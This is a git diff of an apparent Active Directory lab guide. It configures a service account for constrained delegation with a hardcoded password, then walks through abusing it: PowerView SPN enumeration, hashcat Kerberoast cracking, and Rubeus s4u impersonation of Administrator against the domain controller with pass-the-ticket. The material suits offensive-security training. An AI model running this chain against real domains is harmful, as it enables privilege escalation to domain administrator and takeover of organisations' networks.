@@ -65,16 +65,16 @@ Import-Module ActiveDirectory
 
 # Create Service Account
 New-ADUser -Name "unconstrained-svc" -SAMAccountName "unconstrained-svc" `
-    -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
+    -AccountPassword (ConvertTo-SecureString "sako2005!" -AsPlainText -Force) `
     -Enabled $true -PasswordNeverExpires $true
 
 # Set SPN
-setspn -A HTTP/unconstrained-svc.lab.local unconstrained-svc
+setspn -A HTTP/unconstrained-svc.warzone.oxsium.local unconstrained-svc
 
 # Enable Constrained Delegation + Protocol Transition
 Set-ADAccountControl -Identity "unconstrained-svc" -TrustedToAuthForDelegation $true
 Set-ADUser -Identity "unconstrained-svc" -Add @{
-    'msDS-AllowedToDelegateTo' = @("CIFS/DC01.lab.local","HTTP/DC01.lab.local")
+    'msDS-AllowedToDelegateTo' = @("CIFS/WIN-WARZONE.warzone.oxsium.local","HTTP/WIN-WARZONE.warzone.oxsium.local")
 }
 
 # Check
@@ -82,7 +82,7 @@ Get-ADUser -Identity "unconstrained-svc" -Properties TrustedToAuthForDelegation,
 ```
 
 ```powershell
-Import-Module PowerView.ps1
+Import-Module .\PowerView.ps1
 
 # Find SPN-enabled accounts with PowerView
 Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
@@ -93,16 +93,13 @@ Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
 # Crack Hash
 hashcat -m 13100 hashes.txt rockyou.txt
 
-# The complete chain with Rubeus
-.\Rubeus.exe s4u /user:unconstrained-svc /rc4:NTLM_HASH_BURADA `
-    /impersonateuser:Administrator `
-    /msdsspn:CIFS/DC01.lab.local `
-    /ptt
+# Convert password to NTLM Hash
+.\Rubeus.exe hash /password:sako2005! /user:unconstrained-svc /domain:warzone.oxsium.local
 
-# If the password is known, calculate the NTLM hash (e.g., with Python/CME) or provide the password directly to Rubeus.
-.\Rubeus.exe s4u /user:unconstrained-svc /password:TAPILAN_PAROL `
+# The complete chain with Rubeus
+.\Rubeus.exe s4u /user:unconstrained-svc /rc4:BURAYA_RC4_HASH `
     /impersonateuser:Administrator `
-    /msdsspn:CIFS/DC01.lab.local `
+    /msdsspn:CIFS/WIN-WARZONE.warzone.oxsium.local `
     /ptt
 ```
 
